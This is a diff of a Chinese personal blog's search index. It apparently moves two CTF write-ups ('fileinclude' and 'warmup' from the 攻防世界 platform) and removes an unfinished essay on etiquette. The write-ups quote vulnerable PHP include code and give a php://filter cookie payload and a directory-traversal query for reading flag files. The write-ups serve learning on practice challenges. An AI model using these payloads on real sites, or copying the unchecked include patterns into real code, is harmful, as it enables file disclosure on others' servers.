+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_get				获取一个配置选项的值</span><br><span class="line"></span><br><span class="line">ini_set 			为一个配置选项设置值</span><br><span class="line"></span><br><span class="line">display_errors 		错误回显，一般常用于开发模式，但是很多应用在正式环境中也忘记了关闭此选项。错误回显可以暴露出非常多的敏感信息，为攻击者下一步攻击提供便利。推荐关闭此选项。 </span><br><span class="line">display_errors = On</span><br><span class="line">开启状态下，若出现错误，则报错，出现错误提示</span><br><span class="line">dispaly_errors = Off </span><br><span class="line">关闭状态下，若出现错误，则提示：服务器错误。但是不会出现错误提示</span><br><span class="line"></span><br><span class="line">error_reporting 	设置应该报告何种 PHP 错误</span><br><span class="line">error_reporting(0);  // 关闭所有PHP错误报告</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);  // Report simple running errors</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);  // 报告 E_NOTICE也挺好 (报告未初始化的变量或者捕获变量名的错误拼写)</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);  // 除了 E_NOTICE，报告其他所有错误</span><br><span class="line">error_reporting(E_ALL);  // 报告所有 PHP 错误</span><br><span class="line">error_reporting(-1);  // 报告所有 PHP 错误</span><br><span class="line">ini_set(&#x27;error_reporting&#x27;, E_ALL);  // 和 error_reporting(E_ALL); 一样</span><br><span class="line"></span><br><span class="line">$_COOKiE 			通过 HTTP Cookies 方式传递给当前脚本的变量的数组</span><br><span class="line"></span><br><span class="line">setcookie() 		setcookie() 定义了 Cookie，会和剩下的消息头一起发送给客户端。和其他消息头一样，必须在脚本产生任意输出之前发送 Cookie（由于协议的限制）。</span><br><span class="line"></span><br><span class="line">include 			include 表达式包含并运行指定文件</span><br><span class="line"></span><br><span class="line">file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法</span><br></pre></td></tr></table></figure>
+
+
+<ol start="2">
+<li>构造语句抓包<br>我们分析完源码后可知参数是从cookie传入的，于是可以使用抓包的方法修改cookie<br>接下来我们便是构造语句来获取flag，因为源码中文件名后面会接php，所以不需要在语句末尾中加.php<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie:language=php://filter/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>传参的方式不止一种，灵活处理。</p>
 ]]></content>
       <categories>
         <category>CTF</category>
-        <category>Web</category>
+        <category>文件上传</category>
       </categories>
       <tags>
         <tag>CTF</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -4964,31 +4989,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>攻防世界-fileinclde</title>
-    <url>/2022/11/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileinclude/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>换了种方式，就不会了。</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!?php</span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;display_errors&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$lan</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;language&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$lan</span>)</span><br><span class="line">&#123;</span><br><span class="line">	@<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;language&quot;</span>,<span class="string">&quot;english&quot;</span>);</span><br><span class="line">	@<span class="keyword">include</span>(<span class="string">&quot;english.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	@<span class="keyword">include</span>(<span class="variable">$lan</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_get				获取一个配置选项的值</span><br><span class="line"></span><br><span class="line">ini_set 			为一个配置选项设置值</span><br><span class="line"></span><br><span class="line">display_errors 		错误回显，一般常用于开发模式，但是很多应用在正式环境中也忘记了关闭此选项。错误回显可以暴露出非常多的敏感信息，为攻击者下一步攻击提供便利。推荐关闭此选项。 </span><br><span class="line">display_errors = On</span><br><span class="line">开启状态下，若出现错误，则报错，出现错误提示</span><br><span class="line">dispaly_errors = Off </span><br><span class="line">关闭状态下，若出现错误，则提示：服务器错误。但是不会出现错误提示</span><br><span class="line"></span><br><span class="line">error_reporting 	设置应该报告何种 PHP 错误</span><br><span class="line">error_reporting(0);  // 关闭所有PHP错误报告</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);  // Report simple running errors</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);  // 报告 E_NOTICE也挺好 (报告未初始化的变量或者捕获变量名的错误拼写)</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);  // 除了 E_NOTICE，报告其他所有错误</span><br><span class="line">error_reporting(E_ALL);  // 报告所有 PHP 错误</span><br><span class="line">error_reporting(-1);  // 报告所有 PHP 错误</span><br><span class="line">ini_set(&#x27;error_reporting&#x27;, E_ALL);  // 和 error_reporting(E_ALL); 一样</span><br><span class="line"></span><br><span class="line">$_COOKiE 			通过 HTTP Cookies 方式传递给当前脚本的变量的数组</span><br><span class="line"></span><br><span class="line">setcookie() 		setcookie() 定义了 Cookie，会和剩下的消息头一起发送给客户端。和其他消息头一样，必须在脚本产生任意输出之前发送 Cookie（由于协议的限制）。</span><br><span class="line"></span><br><span class="line">include 			include 表达式包含并运行指定文件</span><br><span class="line"></span><br><span class="line">file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法</span><br></pre></td></tr></table></figure>
-
-
-<ol start="2">
-<li>构造语句抓包<br>我们分析完源码后可知参数是从cookie传入的，于是可以使用抓包的方法修改cookie<br>接下来我们便是构造语句来获取flag，因为源码中文件名后面会接php，所以不需要在语句末尾中加.php<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie:language=php://filter/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>传参的方式不止一种，灵活处理。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>攻防世界-unserialize3</title>
     <url>/2022/12/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-unserialize3/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>是我做的第一道反序列化的ctf呢。</p>
@@ -5015,59 +5015,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>CTF</tag>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界-warmup</title>
-    <url>/2022/12/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己的缺陷在于对于php代码还不甚熟练</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>后台扫描<br>使用DirBuster工具扫描，可知source.php可以打开。<br>打开后是一段php代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>我们注意到还有一个hint.php页面，于是打开该页面，发现提示我们flag在ffffllllaaaagggg里。</p>
-</li>
-<li><p>分析代码</p>
-</li>
-</ol>
-<ul>
-<li><p>变量前的&amp;符号<br>$变量前加&amp;符号，表示引用，也即引用传递。</p>
-</li>
-<li><p>白名单数组</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>is_string()函数<br>该函数是判断内部的变量是否为字符串</p>
-</li>
-<li><p>mb_substr()函数<br>该函数是获取部分字符串</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">string</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">str</span></span><br><span class="line"><span class="comment">从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">start</span></span><br><span class="line"><span class="comment">如果 start 不是负数，返回的字符串会从 str 第 start 的位置开始，从 0 开始计数。举个例子，字符串 &#x27;abcdef&#x27;，位置 0 的字符是 &#x27;a&#x27;，位置 2 的字符是 &#x27;c&#x27;，以此类推。</span></span><br><span class="line"><span class="comment">如果 start 是负数，返回的字符串是从 str 末尾处第 start 个字符开始的。</span></span><br><span class="line"><span class="comment">length</span></span><br><span class="line"><span class="comment">str 中要使用的最大字符数。如果省略了此参数或者传入了 NULL，则会提取到字符串的尾部。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p>
-</li>
-<li><p>mb_strpos()函数<br>该函数是查找字符串在另一个字符串中首次出现的位置</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">int</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">haystack</span></span><br><span class="line"><span class="comment">要被检查的 string。</span></span><br><span class="line"><span class="comment">needle</span></span><br><span class="line"><span class="comment">在 haystack 中查找这个字符串。 和 strpos() 不同的是，数字的值不会被当做字符的顺序值。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<p>基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推。</p>
-</li>
-<li><p>is_array()函数<br>该函数是判断第1个变量是否在第2个数组中</p>
-</li>
-<li><p>empty()函数<br>该函数是检查变量是否为空。<br>当变量不存在、值为空、等于 0、为 false 时，返回 true。否则返回 false。</p>
-</li>
-<li><p>emmm::checkFile()<br>输出emmm函数的返回值</p>
-</li>
-</ul>
-<p>PHP函数代码都解析完毕后，那么我们可以知道传入的参需要满足以下条件：<br>不为空，是字符串，<br>第1个问号(?)前的字符在白名单内</p>
-<ol start="3">
-<li>构造语句<br>我们已经知道了条件，接下来就是构造语句来满足条件。可以看到有include函数，所以我们想到文件包含漏洞。<br>使用目录穿越（..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;）的方式可以访问到父目录，从而访问到ffffllllaaaagggg。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-拿到flag</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>PHP代码看得太少了，导致一堆代码都看不懂！</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PHP</tag>
-        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -5135,6 +5082,59 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>CTF</tag>
         <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界-warmup</title>
+    <url>/2022/12/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-warmup/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自己的缺陷在于对于php代码还不甚熟练</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>后台扫描<br>使用DirBuster工具扫描，可知source.php可以打开。<br>打开后是一段php代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们注意到还有一个hint.php页面，于是打开该页面，发现提示我们flag在ffffllllaaaagggg里。</p>
+</li>
+<li><p>分析代码</p>
+</li>
+</ol>
+<ul>
+<li><p>变量前的&amp;符号<br>$变量前加&amp;符号，表示引用，也即引用传递。</p>
+</li>
+<li><p>白名单数组</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>is_string()函数<br>该函数是判断内部的变量是否为字符串</p>
+</li>
+<li><p>mb_substr()函数<br>该函数是获取部分字符串</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">string</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">str</span></span><br><span class="line"><span class="comment">从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">start</span></span><br><span class="line"><span class="comment">如果 start 不是负数，返回的字符串会从 str 第 start 的位置开始，从 0 开始计数。举个例子，字符串 &#x27;abcdef&#x27;，位置 0 的字符是 &#x27;a&#x27;，位置 2 的字符是 &#x27;c&#x27;，以此类推。</span></span><br><span class="line"><span class="comment">如果 start 是负数，返回的字符串是从 str 末尾处第 start 个字符开始的。</span></span><br><span class="line"><span class="comment">length</span></span><br><span class="line"><span class="comment">str 中要使用的最大字符数。如果省略了此参数或者传入了 NULL，则会提取到字符串的尾部。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p>
+</li>
+<li><p>mb_strpos()函数<br>该函数是查找字符串在另一个字符串中首次出现的位置</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">int</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">haystack</span></span><br><span class="line"><span class="comment">要被检查的 string。</span></span><br><span class="line"><span class="comment">needle</span></span><br><span class="line"><span class="comment">在 haystack 中查找这个字符串。 和 strpos() 不同的是，数字的值不会被当做字符的顺序值。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<p>基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推。</p>
+</li>
+<li><p>is_array()函数<br>该函数是判断第1个变量是否在第2个数组中</p>
+</li>
+<li><p>empty()函数<br>该函数是检查变量是否为空。<br>当变量不存在、值为空、等于 0、为 false 时，返回 true。否则返回 false。</p>
+</li>
+<li><p>emmm::checkFile()<br>输出emmm函数的返回值</p>
+</li>
+</ul>
+<p>PHP函数代码都解析完毕后，那么我们可以知道传入的参需要满足以下条件：<br>不为空，是字符串，<br>第1个问号(?)前的字符在白名单内</p>
+<ol start="3">
+<li>构造语句<br>我们已经知道了条件，接下来就是构造语句来满足条件。可以看到有include函数，所以我们想到文件包含漏洞。<br>使用目录穿越（..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;）的方式可以访问到父目录，从而访问到ffffllllaaaagggg。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+拿到flag</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>PHP代码看得太少了，导致一堆代码都看不懂！</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -5553,21 +5553,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>浅谈礼仪的对象</title>
-    <url>/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</url>
-    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p>
-<span id="more"></span>
-<h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>
-]]></content>
-      <categories>
-        <category>随想</category>
-      </categories>
-      <tags>
-        <tag>随想</tag>
